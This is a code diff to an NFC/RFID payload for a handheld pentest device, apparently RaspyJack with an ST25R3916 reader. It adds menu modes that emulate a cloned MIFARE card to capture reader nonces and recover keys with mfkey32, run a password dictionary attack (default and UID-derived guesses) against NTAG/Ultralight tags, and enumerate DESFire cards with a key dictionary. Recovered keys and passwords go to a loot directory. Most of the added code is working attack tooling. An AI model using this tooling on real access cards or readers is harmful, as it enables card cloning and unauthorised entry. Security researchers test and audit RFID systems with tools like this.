@@ -82,6 +82,10 @@ MENU_ITEMS = [
     ("Write",   _ICON_WRITE),
     ("NDEF",    _ICON_NFC),
     ("Relay",   _ICON_RELAY),
+    ("mfkey",   _ICON_EMULATE),
+    ("NTAG PW", _ICON_LOCK),
+    ("DESFire", _ICON_CARD),
+    ("V/F/B",   _ICON_NFC),
 ]
 
 # ── EvilRelay transport (RaspyJack = ISO-DEP emulator, TCP server) ─────
@@ -300,6 +304,16 @@ def _read_ultralight(drv, card):
 
     result["sectors_ok"] = len(pages)
 
+    # Decode model / config / lock bits + verify NXP originality signature.
+    try:
+        from payloads.nfc_rfid import _ntag_info
+        result["model_info"] = _ntag_info.decode_version(ver)
+        result["config"] = _ntag_info.decode_config(pages, total)
+        if sig and card.uid:
+            result["genuine"] = _ntag_info.verify_originality(bytes(card.uid), sig)
+    except Exception:
+        pass
+
     # Decode NDEF content
     raw = b""
     for p in sorted(pages.keys()):
@@ -468,6 +482,30 @@ def _draw_card_info(card, card_data, scroll):
     d.text((PAD + 20, y + 1), f"{len(blocks)} blocks  {ok} sectors OK",
            font=FONT_SM, fill=C_ORANGE)
     y += 20 if IS_WIDE else 14
+
+    # NTAG / Ultralight decoded info (model, originality, config, locks)
+    if card_data and (card_data.get("model_info") or card_data.get("version")):
+        try:
+            from payloads.nfc_rfid import _ntag_info
+            nlines = _ntag_info.info_lines(
+                card_data.get("model_info"), card_data.get("config"),
+                card_data.get("counter"), card_data.get("signature"),
+                card_data.get("genuine"))
+        except Exception:
+            nlines = []
+        for ln in nlines:
+            genuine = card_data.get("genuine")
+            col = C_WHITE
+            if ln.startswith("Originality: GENUINE"):
+                col = C_GREEN
+            elif ln.startswith("Originality: FAIL"):
+                col = C_RED
+            elif ln.startswith(("PROT", "PWD", "AUTH0")):
+                col = C_ORANGE
+            d.text((PAD, y), ln[:42 if IS_WIDE else 24], font=FONT_SM, fill=col)
+            y += LINE_H
+        if nlines:
+            y += 2
 
     # Show NDEF content if present
     ndef = card_data.get("ndef") if card_data else None
@@ -1287,6 +1325,302 @@ def _write_ndef_to_tag(ndef_record):
 
 # ── Main Menu ────────────────────────────────────────────────────────
 
+# ── Shared scrollable text viewer ─────────────────────────────────────
+
+def _scroll_view(title, lines, icon=None, footer="K3:Back"):
+    """Display a scrollable list of text lines until KEY3."""
+    scroll = 0
+    per = max(1, (H - HDR_H - FTR_H - 4) // LINE_H)
+    while _running:
+        btn = _btn()
+        if btn == "KEY3":
+            return
+        if btn == "UP":
+            scroll = max(0, scroll - 1)
+        if btn == "DOWN":
+            scroll = min(max(0, len(lines) - per), scroll + 1)
+        img = _new_img()
+        d = _draw(img)
+        _draw_header(d, title, right=f"{scroll+1}/{max(1,len(lines))}", icon=icon)
+        y = HDR_H + 3
+        for ln in lines[scroll:scroll + per]:
+            d.text((PAD, y), ln[:40], font=FONT_SM if IS_WIDE else FONT_XS, fill=C_WHITE)
+            y += LINE_H
+        _draw_footer(d, footer)
+        _show(img)
+        time.sleep(0.05)
+
+
+# ── mfkey32 Mode (emulate + capture reader nonces) ────────────────────
+
+def _mode_mfkey():
+    _draw_msg("mfkey32", "Read card to clone...", C_CYAN, _ICON_EMULATE)
+    drv = _open_driver()
+    if not drv:
+        _draw_msg("Error", "ST25R3916 not found", C_RED, _ICON_TIMES)
+        time.sleep(2)
+        return
+    try:
+        card = drv.read_passive_target(timeout=3.0)
+        if card:
+            uid = bytes(card.uid) if card.uid else b"\x00" * 4
+            atqa = card.atqa if card.atqa else 0x0004
+            sak = card.sak if card.sak else 0x08
+        else:
+            uid, atqa, sak = bytes.fromhex("DEADBEEF"), 0x0004, 0x08
+        _safe_close(drv)
+        drv = _open_driver()
+        stats = {"n": 0}
+
+        def on_event(ev):
+            stats["n"] = ev.get("count", stats["n"])
+            _draw_msg("mfkey32 capture", f"{stats['n']} nonces  (K3 stop)",
+                      C_GREEN, _ICON_EMULATE)
+
+        from payloads._nfc_emulator import NFCEmulator
+        emu = NFCEmulator(drv)
+        _draw_msg("mfkey32", "Tap on reader... K3=stop", C_ORANGE, _ICON_EMULATE)
+        caps = emu.capture_mfkey32(uid, int(atqa), int(sak),
+                                   on_event=on_event,
+                                   should_stop=lambda: _btn() == "KEY3")
+        from payloads.nfc_rfid._mfkey32 import save_nonces, solve_captures
+        path = os.path.join(LOOT_DIR, "mfkey_nonces.txt")
+        try:
+            os.makedirs(LOOT_DIR, exist_ok=True)
+            save_nonces(path, caps)
+            saved = path
+        except Exception as e:
+            saved = f"save err: {e}"
+
+        # On-device key recovery with the compiled mfkey32v2 tool (official
+        # proxmark3 build). solve_captures() returns {(keytype, block): key} for
+        # every sector that captured two distinct nonce pairs.
+        _draw_msg("mfkey32", "Recovering key...", C_CYAN, _ICON_EMULATE)
+        try:
+            keys = solve_captures(caps)
+        except Exception:
+            keys = {}
+
+        lines = [f"Captured: {len(caps)} nonces", f"UID {uid.hex().upper()}"]
+        if keys:
+            kpath = os.path.join(LOOT_DIR, "mfkey_found.txt")
+            try:
+                with open(kpath, "a") as f:
+                    for (kt, blk), k in sorted(keys.items()):
+                        f.write("UID %s key%s blk%d %012X\n" % (
+                            uid.hex().upper(), "A" if kt == 0x60 else "B", blk, k))
+            except Exception:
+                kpath = saved
+            lines.append(f"RECOVERED {len(keys)} key(s):")
+            for (kt, blk), k in sorted(keys.items())[:6]:
+                lines.append(" key%s b%d %012X" % ("A" if kt == 0x60 else "B", blk, k))
+            lines.append(f"Saved: {kpath}")
+        else:
+            lines += [f"Saved: {saved}", "No key on-device.",
+                      "Recover offline:", "PM3/Flipper mfkey32v2"]
+        _scroll_view("mfkey32", lines, icon=_ICON_EMULATE)
+    except Exception as e:
+        _draw_msg("mfkey Error", str(e)[:24], C_RED, _ICON_TIMES)
+        time.sleep(2)
+    finally:
+        _safe_close(drv)
+
+
+# ── NTAG / Ultralight-EV1 password attack ─────────────────────────────
+# NTAG21x / UL-EV1 gate pages behind a 32-bit password: reader sends PWD_AUTH
+# (0x1B + 4 bytes), tag returns a 2-byte PACK only when correct. Targeted
+# dictionary (defaults + UID-derived) — NOT a full 2^32 brute (AUTHLIM can lock
+# the tag after N wrong tries). A failed PWD_AUTH halts the tag, so we re-select
+# between attempts.
+
+_NTAG_CMD_PWD_AUTH = 0x1B
+_NTAG_PWD_DICT = [
+    "FFFFFFFF", "00000000", "12345678", "11111111", "22222222", "AABBCCDD",
+    "1A2B3C4D", "DEADBEEF", "CAFEBABE", "A0A1A2A3", "B0B1B2B3", "4E585032",
+    "88888888", "99999999", "12341234", "0F0F0F0F",
+]
+
+
+def _ntag_pwd_candidates(uid):
+    """Default/common passwords + a few heuristic UID-derived guesses."""
+    seen, out = set(), []
+    for h in _NTAG_PWD_DICT:
+        b = bytes.fromhex(h)
+        if b not in seen:
+            seen.add(b); out.append(b)
+    try:
+        if len(uid) >= 7:
+            for b in (bytes([uid[1] ^ uid[3] ^ 0xAA, uid[2] ^ uid[4] ^ 0x55,
+                             uid[3] ^ uid[5] ^ 0xAA, uid[4] ^ uid[6] ^ 0x55]),
+                      bytes(uid[3:7]), bytes(uid[0:4]),
+                      bytes(x ^ 0xFF for x in uid[3:7])):
+                if b not in seen:
+                    seen.add(b); out.append(b)
+    except Exception:
+        pass
+    return out
+
+
+def _mode_ntag_pwd():
+    _draw_msg("NTAG PWD", "Place NTAG/UL tag", C_CYAN, _ICON_LOCK)
+    drv = _open_driver()
+    if not drv:
+        _draw_msg("Error", "ST25R3916 not found", C_RED, _ICON_TIMES)
+        time.sleep(2)
+        return
+    try:
+        card = drv.read_passive_target(timeout=3.0)
+        if not card:
+            _draw_msg("NTAG PWD", "No tag", C_RED, _ICON_TIMES)
+            time.sleep(1.5)
+            return
+        uid = bytes(card.uid) if card.uid else b""
+        cands = _ntag_pwd_candidates(uid)
+        found = None
+        for i, pwd in enumerate(cands):
+            _draw_msg("NTAG PWD", f"try {i+1}/{len(cands)} {pwd.hex().upper()}",
+                      C_ORANGE, _ICON_LOCK)
+            if _btn() == "KEY3":
+                break
+            resp = drv.data_exchange(bytes([_NTAG_CMD_PWD_AUTH]) + pwd)
+            if resp and len(resp) >= 2:
+                found = (pwd, bytes(resp[:2]))
+                break
+            drv.read_passive_target(timeout=1.0)  # re-select after NAK/halt
+        if found:
+            pwd, pack = found
+            saved = os.path.join(LOOT_DIR, "ntag_pwd_found.txt")
+            try:
+                os.makedirs(LOOT_DIR, exist_ok=True)
+                with open(saved, "a") as f:
+                    f.write("UID %s PWD %s PACK %s\n" % (
+                        uid.hex().upper(), pwd.hex().upper(), pack.hex().upper()))
+            except Exception:
+                saved = "save err"
+            _scroll_view("NTAG PWD", [
+                "PASSWORD FOUND",
+                "PWD  " + pwd.hex().upper(),
+                "PACK " + pack.hex().upper(),
+                "UID " + uid.hex().upper(),
+                "Saved: " + saved,
+            ], icon=_ICON_CHECK)
+        else:
+            _scroll_view("NTAG PWD", [
+                f"No pwd ({len(cands)} tried)",
+                "UID " + uid.hex().upper(),
+                "Extend _NTAG_PWD_DICT",
+            ], icon=_ICON_TIMES)
+    except Exception as e:
+        _draw_msg("NTAG Error", str(e)[:24], C_RED, _ICON_TIMES)
+        time.sleep(2)
+    finally:
+        _safe_close(drv)
+
+
+# ── DESFire Mode (enumerate + auth + read) ────────────────────────────
+
+def _mode_desfire():
+    _draw_msg("DESFire", "Waiting for card...", C_ORANGE, _ICON_CARD)
+    drv = _open_driver()
+    if not drv:
+        _draw_msg("Error", "ST25R3916 not found", C_RED, _ICON_TIMES)
+        time.sleep(2)
+        return
+    try:
+        card = drv.read_passive_target(timeout=3.0)
+        if not card:
+            _draw_msg("No Card", "Place DESFire card", C_RED, _ICON_TIMES)
+            time.sleep(2)
+            return
+        from payloads._iso14443_4 import ISO14443_4
+        from payloads.nfc_rfid.nfc_desfire import enumerate_card
+        iso = ISO14443_4(drv)
+        if not iso.activate():
+            _draw_msg("Error", "Not ISO-DEP / DESFire", C_RED, _ICON_TIMES)
+            time.sleep(2)
+            return
+        _draw_msg("DESFire", "Enumerating...", C_CYAN, _ICON_CARD)
+        info = enumerate_card(iso, key_dict_path=os.path.join(LOOT_DIR, "desfire_keys.txt"))
+        lines = []
+        v = info.get("version", {})
+        if v:
+            lines.append("HW %s UID %s" % (v.get("hw_type", "?"), v.get("uid", "?")))
+            lines.append("Storage %s" % v.get("storage", "?"))
+        lines.append("Free mem: %s" % info.get("free_mem", "?"))
+        for app in info.get("apps", []):
+            lines.append("AID %s  auth:%s" % (app.get("aid", "?"), app.get("auth", "-")))
+            for f in app.get("files", []):
+                d = f.get("data") or f.get("value")
+                lines.append("  f%s %s %s" % (f.get("fid", "?"),
+                                              f.get("settings", {}).get("type", ""),
+                                              (d[:16] if isinstance(d, str) else "") or ""))
+        if not lines:
+            lines = ["(no data)"]
+        _scroll_view("DESFire", lines, icon=_ICON_CARD)
+    except Exception as e:
+        _draw_msg("DESFire Error", str(e)[:24], C_RED, _ICON_TIMES)
+        time.sleep(2)
+    finally:
+        _safe_close(drv)
+
+
+# ── Scan V/F/B Mode (NFC-F FeliCa + NFC-B poll) ───────────────────────
+
+def _mode_scan_vfb():
+    _draw_msg("Scan V/F/B", "Scanning NFC-F/B...", C_ORANGE, _ICON_NFC)
+    drv = _open_driver()
+    if not drv:
+        _draw_msg("Error", "ST25R3916 not found", C_RED, _ICON_TIMES)
+        time.sleep(2)
+        return
+    try:
+        from payloads.nfc_rfid._nfc_vfb import felica_poll, isob_poll
+        lines = []
+        while _running:
+            btn = _btn()
+            if btn == "KEY3":
+                return
+            f = None
+            b = None
+            try:
+                f = felica_poll(drv)
+            except Exception:
+                f = None
+            if not f:
+                try:
+                    b = isob_poll(drv)
+                except Exception:
+                    b = None
+            if f:
+                lines = ["FeliCa (NFC-F)",
+                         "IDm " + f["idm"].hex().upper(),
+                         "PMm " + f["pmm"].hex().upper()]
+                if f.get("sys"):
+                    lines.append("Sys " + f["sys"].hex().upper())
+            elif b:
+                lines = ["ISO14443-B",
+                         "PUPI " + b["pupi"].hex().upper(),
+                         "ATQB " + b["atqb"].hex().upper()]
+            else:
+                lines = ["No NFC-F / NFC-B tag", "(place tag, scanning...)"]
+            img = _new_img()
+            d = _draw(img)
+            _draw_header(d, "Scan V/F/B", icon=_ICON_NFC)
+            y = HDR_H + 6
+            for ln in lines:
+                d.text((PAD, y), ln[:40], font=FONT_SM if IS_WIDE else FONT_XS,
+                       fill=C_GREEN if (f or b) else C_DIM)
+                y += LINE_H + 2
+            _draw_footer(d, "K3:Back")
+            _show(img)
+            time.sleep(0.2)
+    except Exception as e:
+        _draw_msg("V/F/B Error", str(e)[:24], C_RED, _ICON_TIMES)
+        time.sleep(2)
+    finally:
+        _safe_close(drv)
+
+
 # ── Relay Mode (EvilRelay emulator: TCP server + ISO-DEP target) ──────
 
 def _relay_local_ip():
@@ -1557,7 +1891,9 @@ def main():
                 {"Read": _mode_read, "Saved": _mode_saved,
                  "Emulate": _mode_emulate, "EMV": _mode_emv,
                  "Write": _mode_write, "NDEF": _mode_ndef,
-                 "Relay": _mode_relay,
+                 "Relay": _mode_relay, "mfkey": _mode_mfkey,
+                 "NTAG PW": _mode_ntag_pwd,
+                 "DESFire": _mode_desfire, "V/F/B": _mode_scan_vfb,
                  }.get(label, lambda: None)()
 
             img = _new_img()
